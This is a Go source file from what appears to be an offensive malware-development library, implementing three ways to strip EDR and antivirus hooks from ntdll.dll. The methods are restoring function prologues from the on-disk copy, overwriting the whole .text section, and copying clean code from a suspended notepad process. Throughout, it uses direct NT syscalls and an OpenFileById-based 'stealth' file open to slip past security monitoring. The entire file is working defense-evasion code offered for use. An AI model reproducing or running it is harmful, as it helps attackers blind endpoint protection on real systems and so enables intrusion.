//go:build windows

// Package unhook provides techniques to remove EDR/AV hooks from ntdll.dll.
//
// Technique: Restore original ntdll.dll function bytes from a clean copy.
// MITRE ATT&CK: T1562.001 (Impair Defenses: Disable or Modify Tools)
// Detection: High — reading ntdll from disk or spawning processes is monitored.
//
// Three methods by increasing sophistication:
//   - ClassicUnhook: restore first bytes of a function from a disk copy of ntdll
//   - FullUnhook: replace the entire .text section from a disk copy
//   - PerunUnhook: read pristine ntdll from a freshly spawned child process (notepad)
package unhook

import (
	"bytes"
	"debug/pe"
	"encoding/binary"
	"fmt"
	"io"
	"path/filepath"
	"unsafe"

	"golang.org/x/sys/windows"

	"github.com/oioio-space/maldev/evasion/stealthopen"
	"github.com/oioio-space/maldev/win/api"
	wsyscall "github.com/oioio-space/maldev/win/syscall"
)

// readNtdllBytes reads the clean on-disk ntdll.dll through opener. A nil
// opener falls back to stealthopen.Standard (plain os.Open path read) —
// identical to the pre-Opener behavior. Passing a *stealthopen.Stealth
// built with NewStealth(ntdllPath) routes the read through OpenFileById
// and bypasses path-based EDR file hooks.
func readNtdllBytes(opener stealthopen.Opener) ([]byte, error) {
	sysDir, _ := windows.GetSystemDirectory()
	ntdllPath := filepath.Join(sysDir, "ntdll.dll")
	f, err := stealthopen.Use(opener).Open(ntdllPath)
	if err != nil {
		return nil, fmt.Errorf("open ntdll.dll: %w", err)
	}
	defer f.Close()
	return io.ReadAll(f)
}

// runtimeCriticalFuncs are ntdll functions called internally by the Go runtime
// for file I/O and handle management. Patching these with INT3 or invalid bytes
// will deadlock or crash the process because ClassicUnhook itself uses file I/O
// (os.ReadFile) which calls these functions.
var runtimeCriticalFuncs = map[string]bool{
	"NtClose":              true,
	"NtCreateFile":         true,
	"NtReadFile":           true,
	"NtWriteFile":          true,
	"NtQueryVolumeInformationFile": true,
	"NtQueryInformationFile":       true,
	"NtSetInformationFile":         true,
	"NtFsControlFile":              true,
}

// ClassicUnhook restores the first 5 bytes of a hooked ntdll function
// by reading the original prologue from the clean ntdll.dll on disk.
//
// This works because the on-disk ntdll is never hooked — EDR hooks are
// applied in-memory after the DLL is loaded.
//
// Returns an error if funcName is a Go-runtime-critical I/O function
// (NtClose, NtCreateFile, NtReadFile, NtWriteFile, etc.) because patching
// these would deadlock: this function reads ntdll.dll from disk, which
// calls these same functions via the Go runtime. Use FullUnhook instead
// to restore all functions atomically.
func ClassicUnhook(funcName string, caller *wsyscall.Caller, opener stealthopen.Opener) error {
	if runtimeCriticalFuncs[funcName] {
		return fmt.Errorf("refusing to unhook %s: Go runtime depends on it for file I/O (use FullUnhook instead)", funcName)
	}

	// Read the clean ntdll from disk and parse as PE. Opener is optional;
	// nil keeps the historic path-based read. A *stealthopen.Stealth
	// built for ntdll.dll makes the open bypass path-based EDR hooks.
	rawBytes, err := readNtdllBytes(opener)
	if err != nil {
		return err
	}

	freshDLL, err := pe.NewFile(bytes.NewReader(rawBytes))
	if err != nil {
		return fmt.Errorf("parse ntdll.dll: %w", err)
	}

	// Find the export RVA and read first 5 bytes from .text section
	freshBytes, err := readExportBytes(freshDLL, rawBytes, funcName, 5)
	if err != nil {
		return fmt.Errorf("read export: %w", err)
	}

	// Get the address of the function in the loaded (hooked) ntdll
	proc := api.Ntdll.NewProc(funcName)
	if err := proc.Find(); err != nil {
		return fmt.Errorf("find loaded function: %w", err)
	}

	// Overwrite the hooked bytes with the clean ones
	return api.PatchMemoryWithCaller(proc.Addr(), freshBytes, caller)
}

// FullUnhook replaces the entire .text section of the loaded ntdll.dll
// with the clean version from disk. This removes ALL hooks at once.
//
// opener is optional: nil reads ntdll.dll via os.Open (historic path-based
// read); passing a *stealthopen.Stealth built for ntdll.dll routes the
// read through OpenFileById, bypassing path-based EDR file hooks that
// specifically watch CreateFile on System32\ntdll.dll.
func FullUnhook(caller *wsyscall.Caller, opener stealthopen.Opener) error {
	rawBytes, err := readNtdllBytes(opener)
	if err != nil {
		return err
	}

	freshDLL, err := pe.NewFile(bytes.NewReader(rawBytes))
	if err != nil {
		return fmt.Errorf("parse ntdll.dll: %w", err)
	}

	var textSection *pe.Section
	for _, sec := range freshDLL.Sections {
		if sec.Name == ".text" {
			textSection = sec
			break
		}
	}
	if textSection == nil {
		return fmt.Errorf(".text section not found in ntdll.dll")
	}

	freshText, err := textSection.Data()
	if err != nil {
		return fmt.Errorf("read .text data: %w", err)
	}

	ntdllHandle, err := windows.LoadLibrary("ntdll.dll")
	if err != nil {
		return fmt.Errorf("LoadLibrary ntdll: %w", err)
	}
	baseAddr := uintptr(ntdllHandle)
	textAddr := baseAddr + uintptr(textSection.VirtualAddress)
	textSize := uintptr(len(freshText))

	var oldProtect uint32
	if caller != nil {
		// Route through NT syscalls to bypass potential hooks on VirtualProtect/WriteProcessMemory.
		process := ^uintptr(0) // current process pseudo-handle
		baseAddr := textAddr
		regionSize := textSize
		r, err := caller.Call("NtProtectVirtualMemory",
			process,
			uintptr(unsafe.Pointer(&baseAddr)),
			uintptr(unsafe.Pointer(&regionSize)),
			uintptr(windows.PAGE_EXECUTE_READWRITE),
			uintptr(unsafe.Pointer(&oldProtect)),
		)
		if r != 0 {
			return fmt.Errorf("NtProtectVirtualMemory .text: %w", err)
		}

		var written uintptr
		r, err = caller.Call("NtWriteVirtualMemory",
			process,
			textAddr,
			uintptr(unsafe.Pointer(&freshText[0])),
			textSize,
			uintptr(unsafe.Pointer(&written)),
		)
		if r != 0 {
			return fmt.Errorf("NtWriteVirtualMemory .text: %w", err)
		}

		// Restore original protection.
		baseAddr = textAddr
		regionSize = textSize
		var dummy uint32
		caller.Call("NtProtectVirtualMemory",
			process,
			uintptr(unsafe.Pointer(&baseAddr)),
			uintptr(unsafe.Pointer(&regionSize)),
			uintptr(oldProtect),
			uintptr(unsafe.Pointer(&dummy)),
		)
	} else {
		if err := windows.VirtualProtect(textAddr, textSize, windows.PAGE_EXECUTE_READWRITE, &oldProtect); err != nil {
			return fmt.Errorf("VirtualProtect .text: %w", err)
		}

		var written uintptr
		currentProcess, _ := windows.GetCurrentProcess()
		if err := windows.WriteProcessMemory(currentProcess, textAddr, &freshText[0], textSize, &written); err != nil {
			return fmt.Errorf("WriteProcessMemory .text: %w", err)
		}

		windows.VirtualProtect(textAddr, textSize, oldProtect, &oldProtect)
	}
	return nil
}

// PerunUnhook reads a pristine copy of ntdll.dll from a freshly spawned
// suspended process. The child process has a clean ntdll because EDR hooks
// are typically applied after process initialization.
// Spawns notepad.exe as the child process. Use PerunUnhookTarget to choose
// a different host process.
func PerunUnhook(caller *wsyscall.Caller) error {
	return PerunUnhookTarget("notepad.exe", caller)
}

// PerunUnhookTarget is like PerunUnhook but spawns the specified process
// instead of notepad.exe. Common alternatives: "svchost.exe", "calc.exe".
//
// Steps:
//  1. Spawn target in suspended state
//  2. Read the ntdll.dll .text section from the child process memory
//  3. Overwrite our hooked .text section with the clean copy
//  4. Terminate the child process
func PerunUnhookTarget(target string, caller *wsyscall.Caller) error {
	if target == "" {
		target = "notepad.exe"
	}
	sysDir, _ := windows.GetSystemDirectory()
	targetPath, _ := windows.UTF16PtrFromString(filepath.Join(sysDir, target))

	var si windows.StartupInfo
	si.Cb = uint32(unsafe.Sizeof(si))
	var pi windows.ProcessInformation

	err := windows.CreateProcess(
		targetPath, nil, nil, nil, false,
		windows.CREATE_SUSPENDED|windows.CREATE_NO_WINDOW,
		nil, nil, &si, &pi,
	)
	if err != nil {
		return fmt.Errorf("spawn helper process: %w", err)
	}
	defer windows.CloseHandle(pi.Process)
	defer windows.CloseHandle(pi.Thread)
	defer windows.TerminateProcess(pi.Process, 0)

	// Get ntdll base address in our process
	ntdllHandle, err := windows.LoadLibrary("ntdll.dll")
	if err != nil {
		return fmt.Errorf("LoadLibrary ntdll: %w", err)
	}
	localBase := uintptr(ntdllHandle)

	// Parse local ntdll headers to find .text section location and size.
	// Manual PE header walking is used here instead of debug/pe because we
	// are reading the in-memory (loaded) image, not a file on disk. debug/pe
	// expects file-layout sections, while loaded images use RVA-based layout.
	// ClassicUnhook and FullUnhook use debug/pe because they read from disk.
	dosHeader := (*[2]byte)(unsafe.Pointer(localBase))
	if dosHeader[0] != 'M' || dosHeader[1] != 'Z' {
		return fmt.Errorf("invalid MZ header at ntdll base")
	}
	lfanew := *(*int32)(unsafe.Pointer(localBase + 0x3C))
	peHeader := localBase + uintptr(lfanew)

	// PE signature (4 bytes) + COFF header (20 bytes) = optional header at +24
	optHeaderOffset := peHeader + 4 + 20
	// SizeOfOptionalHeader is at COFF header offset +16
	sizeOfOptHdr := *(*uint16)(unsafe.Pointer(peHeader + 4 + 16))
	numSections := *(*uint16)(unsafe.Pointer(peHeader + 4 + 2))

	// Section headers follow the optional header
	sectionBase := optHeaderOffset + uintptr(sizeOfOptHdr)

	var textVA uint32
	var textSize uint32
	for i := uint16(0); i < numSections; i++ {
		secAddr := sectionBase + uintptr(i)*40
		name := (*[8]byte)(unsafe.Pointer(secAddr))
		if string(name[:5]) == ".text" {
			textSize = *(*uint32)(unsafe.Pointer(secAddr + 8))  // VirtualSize
			textVA = *(*uint32)(unsafe.Pointer(secAddr + 12))   // VirtualAddress
			break
		}
	}
	if textVA == 0 {
		return fmt.Errorf(".text section not found in ntdll headers")
	}

	// Read pristine .text from the suspended child process
	// ntdll is loaded at the same base in all processes (ASLR is per-boot, not per-process)
	remoteTextAddr := localBase + uintptr(textVA)
	cleanText := make([]byte, textSize)
	var bytesRead uintptr
	if err := windows.ReadProcessMemory(pi.Process, remoteTextAddr, &cleanText[0], uintptr(textSize), &bytesRead); err != nil {
		return fmt.Errorf("ReadProcessMemory child ntdll: %w", err)
	}

	// Overwrite our hooked .text with the clean copy
	localTextAddr := localBase + uintptr(textVA)
	var oldProtect uint32
	if caller != nil {
		process := ^uintptr(0)
		baseAddr := localTextAddr
		regionSize := uintptr(textSize)
		r, err := caller.Call("NtProtectVirtualMemory",
			process,
			uintptr(unsafe.Pointer(&baseAddr)),
			uintptr(unsafe.Pointer(&regionSize)),
			uintptr(windows.PAGE_EXECUTE_READWRITE),
			uintptr(unsafe.Pointer(&oldProtect)),
		)
		if r != 0 {
			return fmt.Errorf("NtProtectVirtualMemory .text: %w", err)
		}

		var written uintptr
		r, err = caller.Call("NtWriteVirtualMemory",
			process,
			localTextAddr,
			uintptr(unsafe.Pointer(&cleanText[0])),
			uintptr(textSize),
			uintptr(unsafe.Pointer(&written)),
		)
		if r != 0 {
			return fmt.Errorf("NtWriteVirtualMemory .text: %w", err)
		}

		baseAddr = localTextAddr
		regionSize = uintptr(textSize)
		var dummy uint32
		caller.Call("NtProtectVirtualMemory",
			process,
			uintptr(unsafe.Pointer(&baseAddr)),
			uintptr(unsafe.Pointer(&regionSize)),
			uintptr(oldProtect),
			uintptr(unsafe.Pointer(&dummy)),
		)
	} else {
		if err := windows.VirtualProtect(localTextAddr, uintptr(textSize), windows.PAGE_EXECUTE_READWRITE, &oldProtect); err != nil {
			return fmt.Errorf("VirtualProtect .text: %w", err)
		}

		var written uintptr
		currentProcess, _ := windows.GetCurrentProcess()
		if err := windows.WriteProcessMemory(currentProcess, localTextAddr, &cleanText[0], uintptr(textSize), &written); err != nil {
			return fmt.Errorf("WriteProcessMemory .text: %w", err)
		}

		windows.VirtualProtect(localTextAddr, uintptr(textSize), oldProtect, &oldProtect)
	}
	return nil
}

// readExportBytes finds a named export in a PE file and returns the first n bytes
// of the function body by parsing the export directory table.
func readExportBytes(f *pe.File, raw []byte, name string, n int) ([]byte, error) {
	// Get optional header to find export directory RVA
	var exportDirRVA, exportDirSize uint32
	switch oh := f.OptionalHeader.(type) {
	case *pe.OptionalHeader64:
		if len(oh.DataDirectory) > 0 {
			exportDirRVA = oh.DataDirectory[0].VirtualAddress
			exportDirSize = oh.DataDirectory[0].Size
		}
	case *pe.OptionalHeader32:
		if len(oh.DataDirectory) > 0 {
			exportDirRVA = oh.DataDirectory[0].VirtualAddress
			exportDirSize = oh.DataDirectory[0].Size
		}
	}
	if exportDirRVA == 0 {
		return nil, fmt.Errorf("no export directory")
	}
	_ = exportDirSize

	// Convert RVA to file offset
	exportOffset := rvaToOffset(f, exportDirRVA)
	if exportOffset == 0 {
		return nil, fmt.Errorf("cannot resolve export directory offset")
	}

	// Parse IMAGE_EXPORT_DIRECTORY
	// NumberOfNames at offset +24, AddressOfFunctions at +28,
	// AddressOfNames at +32, AddressOfNameOrdinals at +36
	numNames := binary.LittleEndian.Uint32(raw[exportOffset+24:])
	addrFunctions := binary.LittleEndian.Uint32(raw[exportOffset+28:])
	addrNames := binary.LittleEndian.Uint32(raw[exportOffset+32:])
	addrOrdinals := binary.LittleEndian.Uint32(raw[exportOffset+36:])

	namesOff := rvaToOffset(f, addrNames)
	ordinalsOff := rvaToOffset(f, addrOrdinals)
	functionsOff := rvaToOffset(f, addrFunctions)

	for i := uint32(0); i < numNames; i++ {
		// Read name RVA
		nameRVA := binary.LittleEndian.Uint32(raw[namesOff+i*4:])
		nameOff := rvaToOffset(f, nameRVA)
		if nameOff == 0 {
			continue
		}

		// Read null-terminated name
		end := nameOff
		for end < uint32(len(raw)) && raw[end] != 0 {
			end++
		}
		exportName := string(raw[nameOff:end])

		if exportName == name {
			// Get ordinal index
			ordinal := binary.LittleEndian.Uint16(raw[ordinalsOff+i*2:])
			// Get function RVA
			funcRVA := binary.LittleEndian.Uint32(raw[functionsOff+uint32(ordinal)*4:])
			funcOff := rvaToOffset(f, funcRVA)
			if funcOff == 0 {
				return nil, fmt.Errorf("cannot resolve function offset")
			}
			if funcOff+uint32(n) > uint32(len(raw)) {
				return nil, fmt.Errorf("function offset exceeds file size")
			}
			result := make([]byte, n)
			copy(result, raw[funcOff:funcOff+uint32(n)])
			return result, nil
		}
	}

	return nil, fmt.Errorf("export not found in PE")
}

// rvaToOffset converts an RVA to a file offset using section headers.
func rvaToOffset(f *pe.File, rva uint32) uint32 {
	for _, sec := range f.Sections {
		if rva >= sec.VirtualAddress && rva < sec.VirtualAddress+sec.VirtualSize {
			return sec.Offset + (rva - sec.VirtualAddress)
		}
	}
	return 0
}
